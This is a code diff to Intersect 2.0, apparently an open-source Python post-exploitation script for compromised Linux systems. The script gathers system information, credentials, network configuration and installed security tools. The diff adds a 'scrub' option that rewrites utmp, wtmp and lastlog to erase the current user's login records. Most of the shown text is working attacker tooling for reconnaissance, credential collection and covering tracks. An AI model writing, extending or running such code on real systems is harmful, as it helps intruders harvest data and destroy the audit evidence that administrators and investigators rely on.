@@ -3,11 +3,28 @@
 # email: bindshell@live.com  
 # http://github.com/ohdae/Intersect-2.0/ || http://bind.shell.la/projects/Intersect
 #
-# For the full script description, background, and future update plans check the ReadMe document
+# To see the full description of Intersect 2.0, view the attached ReadMe file.
 # The ToDo-List will be updated frequently to show changes, upcoming features, bug fixes, etc.
-# if you find any bugs or have any suggestions or comments, please contact the developer
+# If you find any bugs or have any suggestions or comments, please contact the developer
 #
-
+# Quite a few of these features are being reworked, things are being added, etc.
+# Updates will be rolled out frequently as I work through the code and fix things. Enjoy!
+#-------------------------------------------------------------------------------------------------
+#   Copyright (C) 2012  ohdae | bindshell@live.com
+#
+#    This program is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation, either version 3 of the License, or
+#    (at your option) any later version.
+#
+#    This program is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+#
+#    You should have received a copy of the GNU General Public License
+#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
+#--------------------------------------------------------------------------------------------------
 
 import sys, os, re
 from subprocess import Popen,PIPE,STDOUT,call
@@ -17,7 +34,11 @@ import tarfile
 import socket
 import random, string
 import logging
+import struct
+import getpass
+import pwd
 
+cut = lambda s: str(s).split("\0",1)[0]
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
@@ -43,37 +64,53 @@ def usage():
    print("  -n --network        detailed network info")
    print("  -l --live-hosts      find live hosts on network")
    print("  -c --credentials    locate and save user/system credentials")
-   print("  -p --protection     locate commonly installed AV/FW's, etc")
+   print("  -p --protection     locate commonly installed AV, FW's and extras")
    print("  -a --all-tests      run all and archive final reports *scapy required")
    print("  -t --tar            make archive of final reports")
    print("  -h --help           prints this menu")
+   print("  -s --scrub          scrubs current user/ip from utmp, wtmp & lastlog")
    print("usage: ./intersect.py --daemon --network --protection")
    print("       ./intersect.py --all-tests\n")
    sys.exit()
 
 def environment():
-   global Current_User
    global Home_Dir
    global Temp_Dir
    global kernel
-   
+   global User_Ip_Address
+   global UTMP_STRUCT_SIZE    
+   global LASTLOG_STRUCT_SIZE
+   global UTMP_FILEPATH      
+   global WTMP_FILEPATH       
+   global LASTLOG_FILEPATH   
+      
    if os.geteuid() != 0:
         print("[!] This script *must* be executed as root. If not, there will be errors and/or crashes.")
         print("[!] Intersect 2.0 is shutting down....Please run again as root")
+        # if user is not root, ask if they want to run exploitCheck() feature to find local root suggestions
         sys.exit()
    else:
         pass
-    
-   Current_User = os.getlogin()
+
    kernel = os.uname()[2]
    distro = os.uname()[1]
    arch = os.uname()[4]
    Home_Dir = os.environ['HOME']
-
+   User_Ip_Address = socket.gethostbyname(socket.gethostname())
+    
    Rand_Dir = ''.join(random.choice(string.letters) for i in xrange(12))
    Temp_Dir = "/tmp/lift-"+"%s" % Rand_Dir
 
+   # You *might* have to change these: 
+   # Tested on Linux ubuntu 3.0.0-12-generic #20-Ubuntu
+   UTMP_STRUCT_SIZE    = 384
+   LASTLOG_STRUCT_SIZE = 292
+   UTMP_FILEPATH       = "/var/run/utmp"
+   WTMP_FILEPATH       = "/var/log/wtmp"
+   LASTLOG_FILEPATH    = "/var/log/lastlog"
+   
    os.system("clear")
+
    print("[-] Creating temporary working environment....")
    os.chdir(Home_Dir)
    if os.path.exists(Temp_Dir) is True:
@@ -99,27 +136,33 @@ def Gather_OS():
    file.close()
    os.system("ls -alh /usr/bin > bin.txt")
    os.system("ls -alh /usr/sbin > sbin.txt")
-   os.system("ls -al /etc/cron* > cronjobs.txt") 
+   os.system("ls -al /etc/cron* > cronjobs.txt")
+   os.system("ls -alhtr /media > media.txt")
+   os.system("ls -alhtr /mnt > mount.txt")
+   os.system("cat /etc/sysctl.conf > sysctl.txt")
+   os.system("find /var/log -type f -exec ls -la {} \; > loglist.txt")
    os.system("uname -a > distro_kernel.txt")
    os.system("df -hT > filesystem.txt")
    os.system("free -lt > memory.txt")
-   sysfiles = ["distro_kernel.txt","filesystem.txt","memory.txt"]
+   os.system("cat /proc/cpuinfo > cpuinfo.txt")
+   os.system("cat /proc/meminfo > meminfo.txt")
+   sysfiles = ["distro_kernel.txt","filesystem.txt","memory.txt","cpuinfo.txt","meminfo.txt"]
    content = ''
    for f in sysfiles:
        content = content + '\n' + open(f).read()
    open('SysInfo.txt','wb').write(content)
-   os.system("rm distro_kernel.txt filesystem.txt memory.txt")
+   os.system("rm distro_kernel.txt filesystem.txt memory.txt cpuinfo.txt meminfo.txt")
    os.mkdir("users/")
    os.chdir("users/")
    file = open("CurrentUser.txt" ,"a")
-   file.write("Current User: "+ Current_User+"\n")
    file.write("\n\nHome Directory: "+ Home_Dir+"\n\n")
    file.close()
    os.system("ls -alhR ~/ > userhome.txt")
    os.system("ls -alhR /home > allusers.txt")
+
    
 def GetCredentials():
-    # multi-thread and pull others
+    # Feature is being rewritten to speed up process and avoid non-root permission issues
     print("[-] Collecting user and system credentials....\n")
     os.mkdir(Temp_Dir+"/credentials")
     os.chdir(Temp_Dir+"/credentials/")
@@ -187,6 +230,8 @@ def NetworkInfo():
         shutil.copy2("/etc/hosts.deny", networkdir)
    if os.path.exists("/etc/hosts.allow") is True:
         shutil.copy2("/etc/hosts.allow", networkdir)
+   if os.path.exists("/etc/inetd.conf") is True:
+        shutil.copy2("/etc/inetd.conf", networkdir)
                
 def NetworkMap():
    # Combine ARP then portscan. Send IPs to list and iterate through for the scan
@@ -256,15 +301,17 @@ def NetworkMap():
   #  print mac
     
 def FindProtect():
-    # check ToDo-List for how this feature is being rewriten
-    # Update will be pushed at later time
+    # check ToDo-List for additional changes
+    # The os.system command runs all at once and is not efficient at all
+    # This is just a temporary way of doing it while I finish rewriting this feature and
+    # add the rest of the applications that we try to find. 
     
     print("[-] Finding system protection applications....\n")
     os.mkdir(Temp_Dir+"/protection")
     protectiondir = (Temp_Dir+"/protection")
     os.chdir(protectiondir)
-    if os.path.exists("/etc/snort/snort.conf") is True:
-        shutil.copy2("/etc/snort/snort.conf", Temp_Dir+"/configs/")
+    #if os.path.exists("/etc/snort/snort.conf") is True:
+    #    shutil.copy2("/etc/snort/snort.conf", Temp_Dir+"/configs/")
     print("[-] Serching for misc extras (netcat, perl, gcc, tcpdump, etc)....")
     os.system("""
     whereis truecrypt > tc.txt && whereis bulldog > bulldog.txt && whereis ufw > ufw.txt && 
@@ -281,9 +328,84 @@ def FindProtect():
     content = ''
     for f in extralists:
         content = content + '\n' + open(f).read()
-    open('Full.List','wb').write(content)
+    open('FullList','wb').write(content)
     os.system("rm *.txt")
 
+# Scrub the logfiles (utmp, wtmp & lastlog) for the current user and their ip/host.
+# Remove their entires and write new files. 
+def ScrubLog():  
+  try:
+    Current_User = os.getlogin()
+  except OSError:
+    print "[!] Cannot find user in logs (Did you already 'scrub'?')"
+    return
+    
+  newUtmp = scrubFile(UTMP_FILEPATH, Current_User)
+  writeNewFile(UTMP_FILEPATH, newUtmp)
+  print "[+] %s cleaned" % UTMP_FILEPATH
+  
+  newWtmp = scrubFile(WTMP_FILEPATH, Current_User)
+  writeNewFile(WTMP_FILEPATH, newWtmp)
+  print "[+] %s cleaned" % WTMP_FILEPATH
+
+  newLastlog = scrubLastlogFile(LASTLOG_FILEPATH, Current_User)
+  writeNewFile(LASTLOG_FILEPATH, newLastlog)
+  print "[+] %s cleaned" % LASTLOG_FILEPATH
+
+
+# This method works both on utmp & wtmp because they have the same struct entries.
+# Once it finds an entry with both the username and ip address (or hostname)
+# it removes it from the new w/utmp file.
+#
+# filePath The fullpath w/filename and extension to read from
+# 
+# returns A new w/utmp binary file
+def scrubFile(filePath, Current_User):
+  newUtmp = ""
+  with open(filePath, "rb") as f:
+    bytes = f.read(UTMP_STRUCT_SIZE)
+    while bytes != "":
+      data = struct.unpack("hi32s4s32s256shhiii36x", bytes)
+      if cut(data[4]) != Current_User and cut(data[5]) != User_Ip_Address:
+	newUtmp += bytes
+      bytes = f.read(UTMP_STRUCT_SIZE)
+  f.close()
+  return newUtmp
+
+# This method is specific to the lastlog file binary format, hence the
+# particulat unpack values I had to determine from the C struct. It also
+# counts as it iterates the binary entries until it finds the entry that 
+# matches the to be hidden users' uid.
+#
+# filePath The fullpath w/filename and extension to read from
+# username The user's pid we are searching for
+# 
+# returns A new lastlog binary file
+def scrubLastlogFile(filePath, Current_User):
+  pw  	     = pwd.getpwnam(Current_User)
+  uid	     = pw.pw_uid
+  idCount    = 0
+  newLastlog = ''
+  
+  with open(filePath, "rb") as f:
+    bytes = f.read(LASTLOG_STRUCT_SIZE)
+    while bytes != "":
+      data = struct.unpack("hh32s256s", bytes)
+      if (idCount != uid):
+	newLastlog += bytes
+      idCount += 1
+      bytes = f.read(LASTLOG_STRUCT_SIZE)
+  return newLastlog
+
+# Writes a binary file.
+#
+# filePath     The fullpath w/filename and extension to read from
+# fileContents The contents to be written to 'filePath'
+def writeNewFile(filePath, fileContents):
+  f = open(filePath, "w+b")
+  f.write(fileContents)
+  f.close()
+  
 def exploitCheck():
     # Shout out to Bernardo Damele for letting me use this code! Thanks again!
     # Check out his blog at http://bernardodamele.blogspot.com
@@ -439,7 +561,7 @@ def main(argv):
     # figure out way to run environment() ONLY if a user gives an option
     # or if i must create it anyways, rm -rf the empty directory if it isnt used by commands
     try:
-        opts, args = getopt.getopt(argv, "dhtonlcpa", ["daemon", "help", "tar", "os-info", "network", "live hosts", "credentials", "protection", "all-tests"])
+        opts, args = getopt.getopt(argv, "dhtonlcpsa", ["daemon", "help", "tar", "os-info", "network", "live hosts", "credentials", "protection", "scrub", "all-tests"])
     except getopt.GetoptError, err:
         print str(err) 
         usage()
@@ -463,6 +585,8 @@ def main(argv):
              GetCredentials() 
         elif o in ("-p", "--protection"): 
              FindProtect()
+        elif o in ("-s", "--scrub"):
+	     ScrubLog()
         elif o in ("-a", "--all-tests"):
              Gather_OS()
              NetworkInfo()
